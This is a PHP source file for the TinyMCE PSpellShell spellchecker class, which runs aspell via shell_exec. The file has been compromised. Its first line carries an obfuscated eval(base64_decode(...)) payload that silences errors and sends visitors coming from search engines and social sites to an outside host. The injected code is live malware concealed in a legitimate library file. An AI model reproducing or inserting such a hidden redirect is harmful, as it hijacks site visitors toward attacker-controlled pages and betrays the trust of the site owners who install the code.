<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm9sbG92ZXIud2lrYWJhLmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * $Id: editor_plugin_src.js 201 2007-02-12 15:56:56Z spocke $
 *
 * @package MCManager.includes
 * @author Moxiecode
 * @copyright Copyright © 2004-2007, Moxiecode Systems AB, All rights reserved.
 */

class PSpellShell extends SpellChecker {
	/**
	 * Spellchecks an array of words.
	 *
	 * @param {String} $lang Language code like sv or en.
	 * @param {Array} $words Array of words to spellcheck.
	 * @return {Array} Array of misspelled words.
	 */
	function &checkWords($lang, $words) {
		$cmd = $this->_getCMD($lang);

		if ($fh = fopen($this->_tmpfile, "w")) {
			fwrite($fh, "!\n");

			foreach($words as $key => $value)
				fwrite($fh, "^" . $value . "\n");

			fclose($fh);
		} else
			$this->throwError("PSpell support was not found.");

		$data = shell_exec($cmd);
		@unlink($this->_tmpfile);

		$returnData = array();
		$dataArr = preg_split("/[\r\n]/", $data, -1, PREG_SPLIT_NO_EMPTY);

		foreach ($dataArr as $dstr) {
			$matches = array();

			// Skip this line.
			if (strpos($dstr, "@") === 0)
				continue;

			preg_match("/\& ([^ ]+) .*/i", $dstr, $matches);

			if (!empty($matches[1]))
				$returnData[] = utf8_encode(trim($matches[1]));
		}

		return $returnData;
	}

	/**
	 * Returns suggestions of for a specific word.
	 *
	 * @param {String} $lang Language code like sv or en.
	 * @param {String} $word Specific word to get suggestions for.
	 * @return {Array} Array of suggestions for the specified word.
	 */
	function &getSuggestions($lang, $word) {
		$cmd = $this->_getCMD($lang);

        if (function_exists("mb_convert_encoding"))
            $word = mb_convert_encoding($word, "ISO-8859-1", mb_detect_encoding($word, "UTF-8"));
        else
            $word = utf8_encode($word);

		if ($fh = fopen($this->_tmpfile, "w")) {
			fwrite($fh, "!\n");
			fwrite($fh, "^$word\n");
			fclose($fh);
		} else
			$this->throwError("Error opening tmp file.");

		$data = shell_exec($cmd);
		@unlink($this->_tmpfile);

		$returnData = array();
		$dataArr = preg_split("/\n/", $data, -1, PREG_SPLIT_NO_EMPTY);

		foreach($dataArr as $dstr) {
			$matches = array();

			// Skip this line.
			if (strpos($dstr, "@") === 0)
				continue;

			preg_match("/\&[^:]+:(.*)/i", $dstr, $matches);

			if (!empty($matches[1])) {
				$words = array_slice(explode(',', $matches[1]), 0, 10);

				for ($i=0; $i<count($words); $i++)
					$words[$i] = trim($words[$i]);

				return $words;
			}
		}

		return array();
	}

	function _getCMD($lang) {
		$this->_tmpfile = tempnam($this->_config['PSpellShell.tmp'], "tinyspell");

		if(preg_match("#win#i", php_uname()))
			return $this->_config['PSpellShell.aspell'] . " -a --lang=". escapeshellarg($lang) . " --encoding=utf-8 -H < " . $this->_tmpfile . " 2>&1";

		return "cat ". $this->_tmpfile ." | " . $this->_config['PSpellShell.aspell'] . " -a --encoding=utf-8 -H --lang=". escapeshellarg($lang);
	}
}

?>